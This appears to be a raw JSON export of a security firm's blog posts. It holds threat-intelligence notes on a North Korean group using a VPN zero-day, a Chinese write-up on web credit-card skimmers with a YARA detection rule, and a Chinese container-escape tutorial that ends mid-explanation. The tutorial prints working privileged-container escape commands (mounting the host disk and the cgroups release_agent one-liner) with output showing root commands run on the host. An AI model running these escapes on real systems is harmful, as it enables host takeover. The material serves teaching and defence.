CloudDragon abusing VPN zero-day vulnerability to launch a new attack against South Korean entities.\n\nTeamT5 recently discovered two malicious samples circulating in South Korea, and both samples are installers of a newly identified backdoor which we named MemzipRAT. With further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc. \n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities recently, including Korean government agencies. According to TeamT5’s threat intelligence, we hold high confidence that the above malware to be follow-up attacks of the disclosed attack campaign conducted by CloudDragon. As the exploitation starts from a popular VPN system, these campaigns might lead to massive attacks and damage in the near future. And TeamT5 will keep taking careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n<br>\n","title":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","__v":0,"id":"60dbea363f9d29004041a50e"},{"locale":"tw","_id":"60dbeb6c3f9d29004041a510","title":"北韓駭客組織再次利用 VPN 零時差漏洞對南韓航太產業發動攻擊","context":"圖片來源：[Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\n北韓 APT 攻擊族群 CloudDragon（又名為 Kimsuky）持續針對南韓政府與組織發動攻擊。 TeamT5 長期持續關注此駭客族群，發現 CloudDragon 近期利用 VPN 零時差漏洞（zero-day vulnerability）對南韓發動另一波新的攻擊。\n\n根據 TeamT5 近期研究，我們發現了兩個攻擊南韓的惡意程式樣本，與我們最新發現的後門程式 MemzipRAT 有高度關聯，皆為其安裝程式。我們推測這一波攻擊是針對南韓某航太產業公司而來，該受駭公司為南韓前十大企業之一，業務範圍涵蓋航太、化學、金融、IT 服務等。攻擊者利用一尚未揭露的  VPN 伺服器漏洞，駭進目標環境並部署惡意程式。\n\n最近多起針對韓國的攻擊，包括南韓政府研究單位受駭，也疑似為 CloudDragon 透過 VPN 服務漏洞展開的入侵行動。根據 TeamT5 掌握的相關情資，我們有高度信心認為，這次攻擊使用的新後門程式為 CloudDragon VPN 攻擊的後續利用。我們推測，攻擊者將持續利用此知名 VPN 系統漏洞，發動更大型、損害更嚴重的攻擊，未來也不排除轉變為供應鏈攻擊的可能。\n\n<br>\n","__v":0,"id":"60dbeb6c3f9d29004041a510"}],"createdAt":"2021-06-30T03:51:18.736Z","updatedAt":"2021-07-01T03:16:55.562Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/north_korea_1151137_1920_0727509c9b.jpg","id":"60dbea363f9d29004041a50d"}],"id":"5ecf88fdfedd7f004b26978c"},{"_id":"5eec1270163518003f86d921","name":"cyber espionage","createdAt":"2020-06-19T01:18:40.849Z","updatedAt":"2020-06-19T01:18:40.849Z","__v":0,"posts":[{"publish":true,"enable_form":false,"tags":["5eec17e7163518003f86d931","5eec125f163518003f86d920","5eec1270163518003f86d921","5ecf890dfedd7f004b26978e"],"relative_posts":["5ecab5be602fc90040476057"],"_id":"5ecf7b2afedd7f004b269777","post_url":"teamt5-and-macnica-networks-release-joint-project-on-2019-s-apt-attacks-in-japan","post_name":"TeamT5 and Macnica Networks Release Joint Project on 2019's APT Attacks in Japan","contents":[{"locale":"en","_id":"5ecf7b2afedd7f004b269778","context":"TeamT5 and Macnica Networks have published our joint research on APT attacks targeting Japan over the past year. In this collaborative research, we provide valuable insight into four advanced persistent threat (APT) groups and actors. The full report will first be available in Japanese and can be accessed at Macnica Networks' website.\n \nThe APT groups' highlighted in this joint project were believed to have been launching cyber espionage campaigns elsewhere in the world. To enhance APT defense strategies, we take a closer look at the four APT groups, including DarkHotel, Huapi (BlackTech), Nian (Tick), and one unclassified backdoor LODEINFO. These APT groups have been threatening crucial sectors in Japan, such as government, military and defense, manufacturing, telecommunication, education, media, and etc.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590655880/APT_Attack_Timeline_2019_2da7de1832.png)\n_The attack timeline of the APT groups' campaigns in Japan in 2019._\n\nMacnica Networks is one of the largest system integrators (SI) in Japan. As a leading network distributor, it provides a wide range of advanced network products and information technology to government offices, educational institutions, and general companies.\n\nTo access the full report, please visit: [https://www.macnica.net/mpressioncss/feature_06.html/](https://www.macnica.net/mpressioncss/feature_06.html/ \"https://www.macnica.net/mpressioncss/feature_06.html/\")","title":"TeamT5 and Macnica Networks Release Joint Project on 2019's APT Attacks in Japan","createdAt":"2020-05-28T08:49:46.852Z","updatedAt":"2020-08-21T18:39:35.275Z","__v":0,"id":"5ecf7b2afedd7f004b269778"}],"createdAt":"2020-05-28T08:49:46.844Z","updatedAt":"2020-10-14T03:41:17.253Z","__v":1,"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590655529/20200527_cover_fafcb121df.jpg","author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","publish_date":"2020-05-27T02:00:00.000Z","id":"5ecf7b2afedd7f004b269777"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921"],"relative_posts":["60dbea363f9d29004041a50d"],"_id":"60dab1403f9d29004041a4fa","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","contents":[{"locale":"en","_id":"60dab3393f9d29004041a4fe","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","__v":0,"context":"*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)\n\nTeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT. The backdoor is named after an embedded string \"get module from cmd memzip : %d\" inside the PE files.\n\nWith further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc.\n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities, including Korean government agencies [1], recently. It is highly possible that they deployed their new malware by the new vulnerability in this case as well. \n\n<br>\n\nYet, there are two key factors that might pull the trigger of massive intrusions:\n\n1. VPN vulnerability\n\n The VPN market in 2020 is USD $30 billion worldwide. That is, the market is huge and has multiple players inside. It could be a starting point for actors to infiltrate various corporations not only in South Korea, but to the whole world.\n \n2. Sectors involved\n\n As the identified target involved in crucial sectors, such as IT, it has a great chance to affect hundreds of entities in a short period.\n\n<br>\n\nWe strongly advise everyone to take careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n## Reference\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n<br>\n\n<br>","id":"60dab3393f9d29004041a4fe"}],"createdAt":"2021-06-29T05:36:00.041Z","updatedAt":"2021-07-01T03:16:55.564Z","__v":0,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/flag_2528969_1920_10918af673.jpg","publish_date":"2021-06-30T10:00:00.000Z","post_name":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","id":"60dab1403f9d29004041a4fa"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921","60dab1533f9d29004041a4fb"],"relative_posts":["60dab1403f9d29004041a4fa"],"_id":"60dbea363f9d29004041a50d","post_name":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","post_url":"another-clouddragon-attack-abusing-vpn-zero-day-vulnerability-to-target-south-korean-entities","publish_date":"2021-07-01T02:00:00.000Z","contents":[{"locale":"en","_id":"60dbea363f9d29004041a50e","context":"*Image courtesy of [Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\nThe North Korean APT group CloudDragon, also known as Kimsuky, continues to target South Korean governments and organizations. TeamT5 has been actively monitoring this threat actor and we recently discovered CloudDragon abusing VPN zero-day vulnerability to launch a new attack against South Korean entities.\n\nTeamT5 recently discovered two malicious samples circulating in South Korea, and both samples are installers of a newly identified backdoor which we named MemzipRAT. With further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc. \n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities recently, including Korean government agencies. According to TeamT5’s threat intelligence, we hold high confidence that the above malware to be follow-up attacks of the disclosed attack campaign conducted by CloudDragon. As the exploitation starts from a popular VPN system, these campaigns might lead to massive attacks and damage in the near future. And TeamT5 will keep taking careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n<br>\n","title":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","__v":0,"id":"60dbea363f9d29004041a50e"},{"locale":"tw","_id":"60dbeb6c3f9d29004041a510","title":"北韓駭客組織再次利用 VPN 零時差漏洞對南韓航太產業發動攻擊","context":"圖片來源：[Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\n北韓 APT 攻擊族群 CloudDragon（又名為 Kimsuky）持續針對南韓政府與組織發動攻擊。 TeamT5 長期持續關注此駭客族群，發現 CloudDragon 近期利用 VPN 零時差漏洞（zero-day vulnerability）對南韓發動另一波新的攻擊。\n\n根據 TeamT5 近期研究，我們發現了兩個攻擊南韓的惡意程式樣本，與我們最新發現的後門程式 MemzipRAT 有高度關聯，皆為其安裝程式。我們推測這一波攻擊是針對南韓某航太產業公司而來，該受駭公司為南韓前十大企業之一，業務範圍涵蓋航太、化學、金融、IT 服務等。攻擊者利用一尚未揭露的  VPN 伺服器漏洞，駭進目標環境並部署惡意程式。\n\n最近多起針對韓國的攻擊，包括南韓政府研究單位受駭，也疑似為 CloudDragon 透過 VPN 服務漏洞展開的入侵行動。根據 TeamT5 掌握的相關情資，我們有高度信心認為，這次攻擊使用的新後門程式為 CloudDragon VPN 攻擊的後續利用。我們推測，攻擊者將持續利用此知名 VPN 系統漏洞，發動更大型、損害更嚴重的攻擊，未來也不排除轉變為供應鏈攻擊的可能。\n\n<br>\n","__v":0,"id":"60dbeb6c3f9d29004041a510"}],"createdAt":"2021-06-30T03:51:18.736Z","updatedAt":"2021-07-01T03:16:55.562Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/north_korea_1151137_1920_0727509c9b.jpg","id":"60dbea363f9d29004041a50d"}],"id":"5eec1270163518003f86d921"}],"relative_posts":["60dbea363f9d29004041a50d"],"_id":"60dab1403f9d29004041a4fa","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","contents":[{"locale":"en","_id":"60dab3393f9d29004041a4fe","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","__v":0,"context":"*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)\n\nTeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT. The backdoor is named after an embedded string \"get module from cmd memzip : %d\" inside the PE files.\n\nWith further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc.\n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities, including Korean government agencies [1], recently. It is highly possible that they deployed their new malware by the new vulnerability in this case as well. \n\n<br>\n\nYet, there are two key factors that might pull the trigger of massive intrusions:\n\n1. VPN vulnerability\n\n The VPN market in 2020 is USD $30 billion worldwide. That is, the market is huge and has multiple players inside. It could be a starting point for actors to infiltrate various corporations not only in South Korea, but to the whole world.\n \n2. Sectors involved\n\n As the identified target involved in crucial sectors, such as IT, it has a great chance to affect hundreds of entities in a short period.\n\n<br>\n\nWe strongly advise everyone to take careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n## Reference\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n<br>\n\n<br>","id":"60dab3393f9d29004041a4fe"}],"createdAt":"2021-06-29T05:36:00.041Z","updatedAt":"2021-07-01T03:16:55.564Z","__v":0,"author":"5eeae9e3163518003f86d917","topic":{"category":"blogs","_id":"5ecaa012a792d70040a0d8b1","name":"Threat Intelligence","color":"#6d96bd","createdAt":"2020-05-24T16:25:54.069Z","updatedAt":"2020-06-07T22:08:35.541Z","__v":0,"contents":[{"locale":"en","_id":"5edd6563bf58af004a154113","text":"Threat Intelligence","createdAt":"2020-06-07T22:08:35.507Z","updatedAt":"2020-06-07T22:08:35.507Z","__v":0,"id":"5edd6563bf58af004a154113"},{"locale":"tw","_id":"5edd6563bf58af004a154114","text":"威脅情資","createdAt":"2020-06-07T22:08:35.507Z","updatedAt":"2020-06-07T22:08:35.507Z","__v":0,"id":"5edd6563bf58af004a154114"},{"locale":"jp","_id":"5edd6563bf58af004a154115","text":"脅威情報","createdAt":"2020-06-07T22:08:35.507Z","updatedAt":"2020-06-07T22:08:35.507Z","__v":0,"id":"5edd6563bf58af004a154115"}],"posts":[{"publish":false,"enable_form":false,"tags":[],"relative_posts":[],"_id":"5f616c556f62730051a42a4a","post_url":"test","post_name":"test","contents":[{"locale":"tw","_id":"5f616c556f62730051a42a4b","title":"test","context":"By Jason3e7 | 圖片來源：[Pixabay](https://pixabay.com/vectors/lock-security-credit-card-5459714/)\n\n## 前言\n\n近期於台灣發生多起信用卡盜刷事件，TeamT5 追蹤到幾起事件後深入調查，並於本文揭露側錄技術，以促進電商資訊安全，保護消費者的權益。\n\n## 技術分析\n\nTeamT5 分析近期多起信用卡盜刷事件，發現過往手法多為攻擊網站後再行 Dump Database，新的手法為存入資料庫之前，於前端程式或後端程式去側錄機敏資訊，以下將以知名 `ASP.NET` 平台的 CMS，DNN（DotNetNuke）作為範例，以前端與後端的攻擊手法分別說明。\n\n- ### 後端程式側錄\n利用高隱匿性的 IIS module，透過修改 config 被 IIS 載入後執行，可於該網站任意頁面側錄資訊。\n經過一段時間收集機敏資訊後，攻擊者再透過其他後門程式，定期將機敏資訊帶走，清除蹤跡。\n運作原理拆解如下：\n<br>\n<style> ol li {padding-left: calc(10px + 1em) !important;}</style>\n<br>\n\n    1. IIS web.config 被新增一行資料以啟用新的 module（LoggerModule）\n![202011-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146682/202011-1_6a6e70e4b2.jpg)\n    2. 於 bin 資料夾底下也新增檔案 System.Logger.dll\n![202011-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146684/202011-2_15be0c2208.jpg)\n    3. 反編譯 System.Logger.dll 之後，檢查內容發現 module 利用 Application_BeginRequest 的特性，於網站每個頁面執行前，執行側錄程式，故不管哪個頁面的機敏資訊都能側錄。\n![202011-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146681/202011-3_ebd6f3620b.jpg)\n    4. 側錄過程於後端接收，故前端無法察覺\n![202011-4](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146681/202011-4_1b178ba603.jpg)\n    5. 側錄資訊\n![202011-5](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146680/202011-5_bc97ae7951.jpg)\n\n\n<br>\n\n### ・前端程式側錄\n利用網站前端複雜的載入資源匿蹤，透過插入 javascript 於前端載入後執行，可於載入頁面側錄資訊。\n\n攻擊者可直接轉拋機敏資訊到遠端主機，或者於網站建立收集器，經過一段時間收集機敏資訊後，再透過其他後門程式，將機敏資訊帶走，清除蹤跡。\n\n運作原理拆解如下：\n\n<br>\n\n1. 可於欲側錄機敏資訊的頁面，任意載入資源的任意位置，插入 javascirpt，只要將案例圖片中 http_server 設定外部接收主機，即可實現側錄遠端轉拋。\n![202011-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146681/202011-6_33f67394c9.jpg)\n\n2. 如利用後端收集器接收，可參考下列圖片\n![202011-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146684/202011-7_9904abacc1.jpg)\n\n3. 網站前端載入資源複雜，不易察覺\n![202011-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146692/202011-8_d2c677c5c1.jpg)\n\n4. 側錄資訊\n![202011-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146691/202011-9_ccfef7c3ab.jpg)\n\n<br>\n\n## 影響與建議\n\n* 自動化或定期檢查程式碼是否被竄改，並做好版本控管\n* 透過 TeamT5 [ThreatSonar](https://teamt5.org/tw/products/threatsonar/) 檢查是否有攻擊者活動跡象\n  * 檢查是否有後門程式、webshell\n  * 是否有可疑連線 C2\n* 使用以下 yara rule 掃描網站目錄，檢查是否存在側錄模組\n\n```\nrule IIS_Module_sniffer\n{\n\tmeta:\n\t\tauthor = \"jason3e7\"\n\t\tdescription = \"detect IIS module sniffer\"\n\t\tdate = \"20201110\"\n\tstrings:\n\t\t$c0 = \"IHttpModule\"\n\t\t$c1 = \"Application_BeginRequest\"\n\t\t$c2 = \"Request\"\n\t\t$c3 = \"Form\"\n\t\t$c4 = \"StreamWriter\"\n\t\t$c5 = \"WriteLine\"\n\t\t$c6 = \"Write\"\n\tcondition:\n\t\t$c0 and $c1 and ($c2 and $c3) and $c4 and ($c5 or $c6) \n}\n```\n","createdAt":"2020-09-16T01:37:25.523Z","updatedAt":"2020-11-16T06:57:08.191Z","__v":0,"id":"5f616c556f62730051a42a4b"},{"locale":"en","_id":"5f616dc46f62730051a42a50","title":"backup","context":"圖片來源：[Pixabay.com](https://pixabay.com/photos/emergency-exit-exit-sign-escape-1321134/)\n\n## 前言\n\n本月來到 D39 與大家分享近期有趣的研究，Lab 團隊雖然不像是科幻電影中的實驗室般，穿著帥氣的白袍與擁有高科技的實驗室，但我們主要專注於最新技術與威脅研究，與惡意程式作者們互相切磋是我們的日常。而 Lab 中的 D39 成員更致力於弱點安全與漏洞挖掘領域，研究範圍包含 Mobile、IOT、Linux、Windows 等有機會連網的系統與裝置都是我們的目標，期許能提升客戶產品安全性，打造優良的上網環境（笑）\n\n這一次由 D39 實習生 Jack，為我們精心整理 Container 相關的弱點攻擊方式，透過清楚易懂的介紹，帶大家了解究竟在駭客眼中的 Container，存在哪些資安問題呢？\n\n## 正文開始\n\n相信大家對 Docker 都不陌生，無論是想要架設網站、資料庫或郵件伺服器，只要一行 `docker run` 就能搞定，不用處理可怕的環境問題，但若它存在漏洞或一些錯誤的設定，跑在 Container 內的 Process 就有可能控制主機。\n\n這次與大家介紹 Container Escape 的一些攻擊方法，讓各位在使用 Container 時可以留意相關的安全隱憂，以及了解這些漏洞造成的影響。\n\n## Container\n\n在介紹攻擊方法之前，先來了解一下 Container 使用到的技術：\n\n* Namespaces\n* Cgroups\n* Seccomp\n* Capabilities\n* LSM\n* OverlayFS\n\n### Namespaces\n\nContainer 好用的地方在於，它能夠建立一個獨立的環境，可以放心地安裝一大堆想嘗試的套件，不怕弄髒自己的環境。要實現這個功能，Namespaces 扮演了一個很重要的角色。\n\n來看看 Linux Programmer's Manual [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html) 的描述：\n\n>A namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource.  Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.  One use of namespaces is to implement containers.\n\n這邊的「資源」（resource）指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。\n\n使用 Namespaces 的方式就是呼叫 `unshare`、`setns`、`clone` 等 System call，類別也不只有 Mount 與 PID，詳細可以看 [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)。\n\n### Cgroups\n\nCgroups 透過 `cgroupfs` 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 `--cpu-shares` 來限制各個 Container 能用到的 CPU 資源。詳細請見 [Cgroups man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)。\n\n### Seccomp\nSeccomp (Secure Computing) 對 CTFer 可能不陌生，用來限制能夠使用的 System call，常見於一些 Shellcode 題。\n\nContainer 很常禁用 `mount` ，因為它是一個方便我們逃離 Container 的 System call，接下來就會說明如何利用 `mount` 逃出 Container。詳細請見 [Seccomp man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)。\n\n### Capabilities\n\nCapabilities 從 Linux Kernel 2.2 開始加入，目的是將權限做更細緻的區隔，以 Container 來說，若直接給它 `root` 權限是不安全的，這意味著它可以隨意載入 Kernel module 或 `mount`，讓 Container 有機會存取 Host 資源，因此 Container 內的 `root` 只有一些基本的 Capabilities，如 CAP\\_CHOWN、CAP\\_KILL、CAP\\_SETUID、CAP\\_SETGID 等。Ubuntu 使用者可以安裝 `libcap2-bin` 並使用 `getpcaps {pid}` 查看該 Process 擁有哪些 Capabilities，詳細請看 [man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)。\n\n### LSM (Linux Security Module)\n\nLinux kernel 文件裡寫道：\n\n> The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy.\n\n如 AppArmor 和 SELinux 都是 Linux Kernel 內建的 Security Module，透過它們專屬的設定檔可以限制 Process 的存取權限，像 Docker 就是使用 AppArmor 限制 `procfs` 以及 `mount`，保護 Host 資源。\n\n### OverlayFS\n\n許多 Container 使用 OverlayFS 當作它的檔案系統，如它的名字，目的就是要把兩個或多個檔案系統合併，讓它看起來是一個檔案系統。它使用了 `upper` 與 `lower` 區分兩種要合併的檔案系統，其中若 `upper` 與 `lower` 有相同檔案時，會以 `upper` 為主。我們用 Container 來解釋，Docker 把 `upper` 當作 Container layer、`lower` 當作 Image layer，我們在 `docker build` 的時候會產生 Image，利用這些 Image 我們可以很快地產出 Container，在 Image 內的檔案如 Ubuntu 預設的系統檔案就會被放在 Image layer，在 Container runtime 產生的檔案，例如 Log 檔會被放在 Container layer，這麼一來建立多個 Container 時可以讓它們的 Image layer 都是同一個，省下許多空間。\n\n來實驗一下，首先開兩個 Container：\n\n```\n$ docker run --name t1 -it ubuntu\nroot@e937832abc06:/#\n```\n\n```\n$ docker run --name t2 -it ubuntu\nroot@71c8a58e90ac:/#\n```\n\n檢查它們的 LowerDir：\n\n```\n$ docker inspect t1 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n$ docker inspect t2 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n```\n\n仔細一看，列出來的路徑幾乎是一樣的，接下來看看裡面有什麼：\n\n```\n$ sudo ls -alF /var/lib/docker/overlay2/07a2cbd7...dbdf/diff\ntotal 24\ndrwxr-xr-x 6 root root 4096 Nov 13  2019 ./\ndrwx------ 4 root root 4096 Nov 13  2019 ../\ndrwxr-xr-x 4 root root 4096 Nov  1  2019 etc/\ndrwxr-xr-x 2 root root 4096 Nov  1  2019 sbin/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 usr/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 var/\n```\n\n是很常見的系統資料夾！也就是 Image layer，接下來看 Container layer：\n\n```\nroot@e937832abc06:/# echo 'hello, host' > /hello\n```\n\n先在 Container 內創立一個檔案：\n\n```\n$ docker inspect e937 | grep Upper\n                \"UpperDir\": \"/var/lib/docker/overlay2/657597a...a966/diff\",\n$ sudo cat /var/lib/docker/overlay2/657597a...a966/diff/hello\nhello, host\n```\n\n然後用 `docker inspect` 找到 UpperDir，就會看到我們建立的 `hello` 檔案了！\n\n<br/>\n\n## Container Escape\n來試想一個情境，有一台主機遵守 Microservices 的精神，使用 Docker 分別架設了網站、資料庫與郵件伺服器這三個 Container，假設郵件伺服器存在漏洞被駭客入侵，也不會直接影響到網站和資料庫，維護的工程師也能很快的用 Docker 換成新版本來進行即時修補。但如果 Container 存在漏洞時，所有的服務都有可能陷入風險。\n\n### Privileged Container\n我們先從比較容易 Escape 的 Privileged Container 開始，Privileged Container 沒有 Seccomp 限制且 Capability 全開，讓 Container 可以存取所有硬體設備，為的就是讓這個 Container 有獨立的環境且能做 Host 能做的事。Docker 建立 Privileged container 的方法很簡單，只要在 `dokcer run` 時多加個 `--privileged` flag 即可。\n\n`docker run --privileged -it ubuntu`\n\n另外還有一個很棒的功能，用 Docker 跑 Docker。聽起來很奇怪但很合理，如果去看 Docker 的[開發文件](https://github.com/docker/docker-ce/blob/master/components/engine/docs/contributing/set-up-dev-env.md)，會發現 Docker 是用 Docker 開發的。\n\n一般來說開發用的 Privileged container 駭客碰不到，但如果是用 Docker 架設 CI/CD 工具，然後使用這些工具的 Docker 功能呢？歡迎參考[這篇](https://www.slideshare.net/Docker/build-publish-deploy-and-test-docker-images-and-containers-with-jenkins-workflow)的 \"How Can You Use Jenkins & Docker Together\"。\n\n沒錯，你需要一個 Privileged container 來運行 CI/CD 工具！接下來先以 Privileged container 為例，說明在我們打下有漏洞的 CI/CD 工具且有 `root` 權限後，要怎麼控制 Host。\n\n#### Mount root\n第一個要介紹的是這個一直被針對的 `mount` ，在 Privileged container 裡是可以直接使用的，來看看如何透過它存取 Host 檔案。\n\n首先先取得 Block device 的 Major 與 Minor：\n\n```\nroot@997453a4062f:/test# ls -alF /sys/dev/block/ | grep sda1\nlrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -> ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/\n```\n\n`sda1` 是 Host 的根目錄（不同的電腦可能不一樣，對駭客來說可以全部都試試看）。接下來用 `mknod` 產 Block special file 然後 `mount`，就會把 Host 的根目錄放在 Container 內了（若 `/dev/sda1` 不存在才需要使用 `mknod`）。\n\nDocker:\n\n```\nroot@997453a4062f:/test# mknod /dev/myroot b 8 1\nroot@997453a4062f:/test# mkdir rootfs; mount /dev/myroot rootfs\nroot@997453a4062f:/test# echo hello, host! > rootfs/hello\n```\n\nHost:\n\n```\nroot@escape:/# cat /hello\nhello, host!\n```\n\n#### Cgroups v1 release notification\n\n只能存取 `root` 資料夾還不夠！我們的目標是能在 Host 上做任何事且不受 Container 影響。接下來要介紹的是 [Felix Wilhelm 在 Twitter 上寫的](https://twitter.com/_fel1x/status/1151487051986087936)：\n\n> Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.\n\n```\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 >$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c >$d/release_agent;echo \"#!/bin/sh\n$1 >$t/o\" >/c;chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n直接用 Docker 跑跑看：\n\n```\n$ docker run --privileged -it ubuntu\nroot@acf8f56c9de6:/test# cat > exp.sh\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 >$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c >$d/release_agent;echo \"#!/bin/sh\n$1 >$t/o\" >/c;chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\";sleep 1;cat /o\nroot@acf8f56c9de6:/test# chmod +x ./exp.sh\nroot@acf8f56c9de6:/test# ./exp.sh ps\n  PID TTY          TIME CMD\n    1 ?        00:01:31 systemd\n    2 ?        00:00:00 kthreadd\n    3 ?        00:00:00 rcu_gp\n    4 ?        00:00:00 rcu_par_gp\n    6 ?        00:00:00 kworker/0:0H-kb\n    9 ?        00:00:00 mm_percpu_wq\n   10 ?        00:00:15 ksoftirqd/0\n   11 ?        00:09:23 rcu_sched\n   12 ?        00:00:02 migration/0\n   13 ?        00:00:00 idle_inject/0\n   14 ?        00:00:00 cpuhp/0\n   15 ?        00:00:00 cpuhp/1\n   16 ?        00:00:00 idle_inject/1\n   17 ?        00:00:03 migration/1\n   18 ?        00:00:05 ksoftirqd/1\n   20 ?        00:00:00 kworker/1:0H-ev\n   ...\nroot@acf8f56c9de6:/test# ./exp.sh id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n太棒了！可以在 Container 外執行任意指令且是 `root` 權限。接下來分析它怎麼做到的：\n\n```\nroot@acf8f56c9de6:/test# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nroot@acf8f56c9de6:/test# echo $d\n/sys/fs/cgroup/rdma\n```\n\n`d` 變數的目的是取得 Cgroups 底下有 `release_agent` 檔案的路徑，`release_agent` 的描述可參考 [Man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)：\n\n> A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty.\n\n變為空的意思：\n\n> A cgroup is considered to be empty when it contains no child cgroups and no member processes.\n\n`release_agent` 一般用來讓使用者自訂腳本，清理新建的 Cgroups 讓 `cgroupfs` 保持乾淨，而它會在 Host 以 `root` 權限執行，所以只要能控制 `release_agent`，我們就可以在 Container 外執行任意指令。\n\n在 Cgroups 資料夾底下創立一個 `w` 資料夾，會讓 Cgroups 創立一個新的群組，然後啟用這個群組的 `notify_on_release`：\n\n```\nmkdir -p $d/w;echo 1 >$d/w/notify_on_release\n```\n\n`t` 變數是找出 Host 可以直接看到 Container 檔案的路徑，也就是 OverlayFS 的 UpperDir (Container layer) ，以便 `release_agent` 能夠呼叫 Container 內的惡意腳本：\n\n```\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' 